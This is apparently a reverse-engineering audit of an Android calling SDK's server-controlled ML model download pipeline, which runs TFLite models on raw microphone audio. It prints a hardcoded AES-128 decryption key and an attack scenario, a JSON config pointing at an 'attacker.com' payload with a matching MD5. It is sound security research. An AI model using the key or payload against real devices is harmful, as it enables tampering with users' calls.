---
tags: [ml-pipeline, server-control, model-download, externcalls-sdk, tflite, native, security-audit]
status: verified
severity: high
sources:
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/ml/MLFeaturesManagerImpl.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/ml/delegate/MLFeatureDelegate.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/ml/delegate/KwsFeatureDelegate.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/ml/delegate/NSFeatureDelegate.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/ml/config/MLFeatureConfigProviderBase.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/ml/config/MLFeatureConfig.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/ml/config/kws/KwsFeatureConfigProvider.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/ml/config/ns/NSFeatureConfigProvider.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/ml/model/MLFeatureType.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/ml/model/ModelSpec.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/net/DownloadService.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/net/FileValidationConfig.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/stat/mldownload/MLDownloadStat.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/api/RemoteSettings.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/config/BaseConfigProvider.java
  - work/jadx_base/sources/org/webrtc/PeerConnectionFactory.java
  - findings/native/libEnhancementLibShared.exports.txt
related:
  - "[[16-server-pushed-ml-models-in-calls]]"
  - "[[532-voice-biometrics-libenhancement]]"
  - "[[547-webview-ssl-bypass-deepfake-tflite-key]]"
  - "[[545-three-audio-interception-channels]]"
  - "[[03-pms-server-flags]]"
---

# Wave 4: Externcalls SDK ML Pipeline — Full Architecture Audit

## TL;DR

Сервер **полностью контролирует** какие ML-модели загружаются на устройство: URL, checksum, enabled-флаг — всё приходит из серверного JSON-конфига по ключу `android.mlfeatures.{version}`. Валидация скачанного файла — **только MD5-checksum** (не криптографическая подпись). Нет whitelist доменов для URL. Нет проверки содержимого .tflite. Модель загружается в `libEnhancementLibShared.so` через `nativeSetPreprocessorParams(path)` / `nativeSetKeywordSpotterParams(path)` и исполняется на **аудиопотоке микрофона до отправки** (preprocessor pipeline). Расшифровка на устройстве — hardcoded AES-128 key в native (topic 547). Архитектура позволяет серверу заменить модель на произвольную .tflite без обновления APK.

## 1. Архитектура pipeline

```
┌─────────────────────────────────────────────────────────────────────┐
│ SERVER                                                               │
│                                                                      │
│  RemoteSettings API → JSON config per key:                          │
│    "android.mlfeatures.ws_0" → {"url":"...","cs":"...","use":true}  │
│    "android.mlfeatures.ns_1" → {"url":"...","cs":"...","use":true}  │
│    "android.wordspotter.config" → {"turnOffInMs": N}                │
└──────────────────────────────┬───────────────────────────────────────┘
                               │ HTTP GET (RemoteSettings.get(key))
                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│ JAVA LAYER: MLFeaturesManagerImpl                                    │
│                                                                      │
│  ┌─ KwsFeatureDelegate (type=WS, version="ws_0")                   │
│  │   configKey = "android.mlfeatures.ws_0"                          │
│  │   requiredExtensions = {tflite, cfg}                             │
│  │                                                                   │
│  └─ NSFeatureDelegate (type=NS, version="ns_1")                    │
│      configKey = "android.mlfeatures.ns_1"                          │
│      requiredExtensions = {tflite, cfg}                             │
│                                                                      │
│  Pipeline per delegate:                                              │
│    1. fetchConfig() → RemoteSettings.get(configKey)                 │
│    2. parseConfig(json) → MLFeatureConfig{url, checksum, enabled}   │
│    3. if !enabled → MLModelCheckResult.Disabled (stop)              │
│    4. validateCurrentModel() → check version + files on disk        │
│    5. if NeedUpdate → downloadModel(config)                         │
│    6. DownloadService.download(url, dest, FileValidationConfig)     │
│       - URL validated only by Patterns.WEB_URL regex                │
│       - File validated by MD5 checksum (from server config!)        │
│    7. unzipModel() → extract .zip to ml_features/{ws|ns}/          │
│    8. saveNewModelInfo() → SharedPreferences                        │
│    9. Return MLModelCheckResult.Enabled(file)                       │
│                                                                      │
│  On success:                                                         │
│    KWS → setKwsParams(file) → KeywordSpotterManager                │
│         → PeerConnectionFactory.setKeywordSpotterParams(enabled,    │
│           filePath, consumer)                                        │
│         → nativeSetKeywordSpotterParams(factory, enabled, path,     │
│           callback)                                                  │
│                                                                      │
│    NS  → setNsParams(file) → NoiseSuppressionManager               │
│         → PeerConnectionFactory.setPreprocessorParams(enabled,      │
│           EnhancerKind.PIPELINE, filePath, sampleRates, ...)        │
│         → nativeSetPreprocessorParams(factory, enabled, kind,       │
│           path, ...)                                                 │
└──────────────────────────────┬───────────────────────────────────────┘
                               │ JNI call with file path
                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│ NATIVE LAYER: libEnhancementLibShared.so                             │
│                                                                      │
│  vk::enh::initTfLite(path)  — loads TFLite runtime                  │
│  vk::enh::decrypt(vector<uint8_t>) — AES-128 with hardcoded key    │
│    key: 6f 8c c4 b7 19 d4 0d 16 d1 fc b9 ba bb c4 7d 7e           │
│                                                                      │
│  TfLiteModelWrapper(Config, vector<uint8_t> decryptedBytes)         │
│    → TfLiteInterpreterWrapper → invoke()                            │
│                                                                      │
│  Registry of ML engines (all Config-driven):                         │
│    - Pipeline (audio preprocessing)                                  │
│    - KWS (keyword spotting)                                          │
│    - ASR (speech recognition)                                        │
│    - AudioClassifier                                                 │
│    - DiarizationEngine                                               │
│    - SpeakerRecognitionEngine                                        │
│    - SpeakerRecognitionVerifier                                      │
│    - Animoji (face animation)                                        │
│    - Wav2LipV1/V3/V4 (lip-sync deepfake)                           │
│    - SuperResolution                                                 │
│    - EnhancementAlgorithm                                            │
│    - ForcedAligner                                                   │
│    - Profanity (profanity detection)                                 │
│    - AudioFilter / AudioMixer / AudioDelayBuffer                    │
│    - AEC / AGC / Codec / Resampler / Nnet / Vfi / Effect / Punct   │
│                                                                      │
│  Execution point: PREPROCESSOR (before Opus encoding & send)        │
│    = runs on LOCAL MICROPHONE audio, before it leaves device        │
└─────────────────────────────────────────────────────────────────────┘
```

## 2. Кто решает какие модели качать

**Сервер.** Полностью.

Конфиг приходит через `RemoteSettings.get(configKey)` — это серверный API, возвращающий JSON-строку. Ключи:
- `"android.mlfeatures.ws_0"` — KWS модель (26.15.3; удалена в 26.16.0)
- `"android.mlfeatures.ns_1"` — NS модель (обе версии)
- `"android.wordspotter.config"` — конфиг поведения KWS (turnOffInMs)

JSON-формат конфига (`MLFeatureConfigProviderBase.parseConfig`):
```json
{
  "url": "<arbitrary URL>",
  "cs": "<MD5 hex checksum>",
  "use": true
}
```

Клиент **не имеет hardcoded URL** для моделей. URL полностью серверно-задаваемый. Единственная клиентская проверка URL — `Patterns.WEB_URL.matcher(url).matches()` (стандартный Android regex для любого валидного URL).

## 3. Какие ML-модели доступны

### В Java ML pipeline (server-downloadable):

| ID | MLFeatureType | Version | Config Key | Status 26.16.0 |
|---|---|---|---|---|
| WS | `MLFeatureType.WS` | `"ws_0"` | `android.mlfeatures.ws_0` | **УДАЛЁН** (KwsFeatureDelegate removed) |
| NS | `MLFeatureType.NS` | `"ns_1"` | `android.mlfeatures.ns_1` | Активен |

### В native Registry (libEnhancementLibShared.so, Config-driven):

Все следующие engine'ы создаются через `Registry<string, Factory>::createClass(name, Config)` — т.е. **конфигурируются строковым именем + Config-объектом**:

1. **Pipeline** — основной audio preprocessing pipeline
2. **KWS** — keyword spotting (KwsBufferizator<float/int/short>)
3. **ASR** — speech recognition
4. **AudioClassifier** — классификация аудио (что именно ловит — определяется моделью)
5. **DiarizationEngine** — определение кто говорит
6. **SpeakerRecognitionEngine** — идентификация голоса
7. **SpeakerRecognitionVerifier** — верификация голоса
8. **Animoji** — face animation (AnimojiFactory)
9. **Wav2LipV1/V3/V4** — lip-sync deepfake
10. **SuperResolution** — улучшение видео
11. **EnhancementAlgorithm** — generic audio enhancement
12. **ForcedAligner** — forced alignment (ASR + timing)
13. **Profanity** — детекция нецензурной лексики
14. **AudioFilter** / **AudioMixer** / **AudioDelayBuffer** — DSP
15. **AEC** / **AGC** / **Codec** / **Resampler** — стандартные аудио-блоки
16. **Nnet** — generic neural network wrapper
17. **Vfi** — video frame interpolation
18. **Effect** — generic effect
19. **Punct** — punctuation (для ASR)

**Ключевое:** Java-слой скачивает .zip с .tflite + .cfg. Native слой читает .cfg и создаёт нужный engine из Registry. Какой именно engine будет создан — определяется **содержимым .cfg файла**, который приходит с сервера.

## 4. Делегирование обработки

```
MLFeaturesManagerImpl.start()
  → для каждого delegate:
    → delegate.checkModel() [RxJava, background thread m6g.b()]
      → fetchConfig() → RemoteSettings API
      → downloadModel() → DownloadService (HttpURLConnection, IO thread)
      → unzipModel() → local filesystem
      → saveNewModelInfo() → SharedPreferences
    → on success: callback(File)
      → KWS: setKwsParams(file) → KeywordSpotterManagerImpl
        → ra1.c.execute(l0(...)) [call executor thread]
          → PeerConnectionFactory.setKeywordSpotterParams(enabled, path, consumer)
            → JNI: nativeSetKeywordSpotterParams
      → NS: setNsParams(file) → NoiseSuppressionManagerImpl
        → ra1.H(hyb) [call executor thread]
          → PeerConnectionFactory.setPreprocessorParams(enabled, PIPELINE, path, ...)
            → JNI: nativeSetPreprocessorParams
```

**Поток исполнения модели:** WebRTC audio processing thread (preprocessor). Это **до** Opus-кодирования и отправки. Модель обрабатывает **сырой PCM с микрофона**.

Для NS: `EnhancerKind.PIPELINE` (value=2) — полный pipeline через libEnhancementLibShared.

## 5. Возможность server-side push произвольной модели

### Что контролирует сервер:

| Параметр | Источник | Валидация клиентом |
|---|---|---|
| URL модели | `config.url` (JSON от сервера) | `Patterns.WEB_URL` regex — **любой HTTP/HTTPS URL** |
| Checksum | `config.cs` (JSON от сервера) | MD5 — **сервер сам задаёт ожидаемый hash** |
| Enabled | `config.use` (JSON от сервера) | boolean |
| Model version | Hardcoded в клиенте (`"ws_0"`, `"ns_1"`) | Сравнение с сохранённой версией |

### Что НЕ проверяется:

1. **Нет whitelist доменов** — URL может быть `http://evil.com/model.zip`
2. **Нет криптографической подписи модели** — только MD5, и checksum задаётся тем же сервером что и URL
3. **Нет проверки содержимого .tflite** — любой валидный TFLite файл будет загружен в интерпретатор
4. **Нет certificate pinning** для download URL
5. **Нет проверки что .cfg соответствует ожидаемому типу** — `isModelValid()` проверяет только наличие файлов с расширениями `{tflite, cfg}` и минимальный размер (default 1 byte)
6. **Нет sandbox** для TFLite inference — модель исполняется в том же процессе

### Сценарий атаки:

Злоумышленник с доступом к серверу (или MITM на RemoteSettings API):
1. Отправляет JSON: `{"url":"https://attacker.com/malicious.zip", "cs":"<md5 of malicious.zip>", "use":true}`
2. Клиент скачивает .zip, проверяет MD5 (совпадает — атакующий сам его вычислил)
3. Распаковывает: `malicious.tflite` + `malicious.cfg`
4. Native загружает модель через `TfLiteModelWrapper`
5. Модель исполняется на каждом аудио-фрейме с микрофона

### Ограничения атаки:

- TFLite interpreter имеет ограниченный набор операций (нет arbitrary code execution через .tflite сам по себе)
- Но модель может: извлекать features из аудио, классифицировать речь, детектировать ключевые слова — и результат возвращается через callback в Java
- Для KWS: callback `NativeDoubleArrayConsumer.Consumer` получает confidence scores → отправляется на сервер как `bad_call_detected_by_audio_spotter(confidence)`
- Для NS: модель обрабатывает аудио in-place (может модифицировать аудиопоток)

## 6. Связь с hardcoded AES key (topic 547)

**Связь подтверждена, но разделение слоёв:**

- **Java-слой** (externcalls SDK ML pipeline): скачивает .zip, распаковывает, передаёт **путь к директории** в native через JNI. Java-слой **не расшифровывает** модели — он работает с .zip файлами.
- **Native-слой** (libEnhancementLibShared.so): при загрузке .tflite из файла вызывает `vk::enh::decrypt(vector<uint8_t>)` с hardcoded AES-128 key `6f 8c c4 b7 19 d4 0d 16 d1 fc b9 ba bb c4 7d 7e`.

Конструктор `TfLiteModelWrapper(Config, vector<uint8_t> decryptedBytes)` принимает уже расшифрованные байты. Значит:
1. Native читает .tflite файл с диска
2. Расшифровывает AES-128 (hardcoded key)
3. Передаёт расшифрованные байты в TFLite interpreter

**Следствие:** серверно-доставленные модели должны быть зашифрованы этим ключом. Но поскольку ключ hardcoded и известен любому реверсеру — это **не защита от подмены**, а только obfuscation от casual analysis.

## 7. Статистика скачивания (MLDownloadStat)

При успешной загрузке:
```
event: "ml_ready_to_use"
value: downloadDurationMs
items: {"source": modelId}  // e.g. "ws_0" or "ns_1"
```

При ошибке:
```
event: "ml_error"
value: error message
items: {"source": modelId}
```

Отправляется через `ConversationStats` → `SingleShotStat` → `uj1.c()` (analytics sender). Один раз за сессию.

## 8. Статус в 26.16.0

- `KwsFeatureDelegate` — **УДАЛЁН** (нет файлов в smali)
- `KwsFeatureConfigProvider` — **УДАЛЁН**
- `MLFeatureType.WS` — **УДАЛЁН** (только NS остался)
- `NSFeatureDelegate` — без изменений
- `MLFeatureDelegate` (base class) — без изменений
- `DownloadService` — без изменений
- `MLFeaturesManagerImpl` — упрощён (только один delegate: NS)
- `libEnhancementLibShared.so` — без изменений (все Registry engines на месте)
- Hardcoded AES key — без изменений

**Важно:** удаление KWS из Java-слоя НЕ удаляет KWS из native. `vk::enh::KWS` и `KwsBufferizator` остаются в .so. Если сервер через NS-конфиг доставит .cfg, указывающий на KWS engine — native его создаст. Java-слой не валидирует тип engine в .cfg.

## 9. Риск-оценка

### Уровень: HIGH (не CRITICAL)

**Почему HIGH:**
1. Сервер может заменить ML-модель на произвольную без обновления APK
2. Нет криптографической подписи моделей (MD5 checksum задаётся сервером)
3. Нет whitelist URL для скачивания
4. Модель исполняется на сыром аудио с микрофона (preprocessor)
5. Native Registry позволяет создать любой из 20+ engine типов через .cfg

**Почему не CRITICAL:**
1. TFLite interpreter — не arbitrary code execution (ограниченный набор ops)
2. Модель не может напрямую exfiltrate данные (нет network access из TFLite)
3. Для KWS: результат (confidence) уходит через callback → Java → сервер — но это **уже задокументированное** поведение
4. Для NS: модель модифицирует аудио in-place — теоретически может «вырезать» или «добавить» звуки, но не exfiltrate
5. Реальная эксплуатация требует контроля над RemoteSettings API сервера

### Сравнение с topic 16:

Topic 16 описывал факт «модели качаются с сервера». Данный аудит добавляет:
- Полную архитектуру pipeline (server config → download → decrypt → load → inference)
- Отсутствие криптографической подписи (только MD5 от того же сервера)
- Отсутствие whitelist URL
- Отсутствие валидации типа engine в .cfg
- Полный список native engines (20+), доступных через Config
- Подтверждение что модель работает на preprocessor thread (до отправки)

## 10. Потенциальные topic-кандидаты (548+)

### Не рекомендую выделять в отдельный topic

Всё найденное — это **детализация** уже известной архитектуры (topics 16, 532, 547). Новых backdoor-примитивов не обнаружено. Конкретно:

- Отсутствие подписи моделей — архитектурная слабость, но не backdoor
- Whitelist URL отсутствует — но URL приходит по тому же каналу что и весь RemoteSettings (если сервер скомпрометирован — модели это наименьшая проблема)
- Native Registry с 20+ engines — это SDK VK Enhancement, не специфика MAX; engines активируются только если .cfg их запрашивает

**Единственная потенциально новая находка:** в 26.16.0 удалён KWS из Java, но KWS engine остаётся в native. Если NS-конфиг доставит .cfg с KWS-секцией — native его создаст. Это может быть «тихое возвращение» KWS через NS-канал. Но это спекуляция — нужно проверить, парсит ли native .cfg строго по типу или generic.

## Файлы

Все исходники перечислены в frontmatter `sources`. Ключевые точки:
- `MLFeatureConfigProviderBase.java:42-46` — parseConfig: url + cs + use
- `MLFeatureDelegate.java:downloadModel()` — download с MD5 validation
- `DownloadService.java:Impl.download$lambda$3()` — URL regex check + MD5 verify
- `MLFeaturesManagerImpl.java:start()` — orchestration
- `PeerConnectionFactory.java:583-588` — nativeSetPreprocessorParams
- `PeerConnectionFactory.java:579-580` — nativeSetKeywordSpotterParams
- `libEnhancementLibShared.exports.txt` — full Registry of native engines
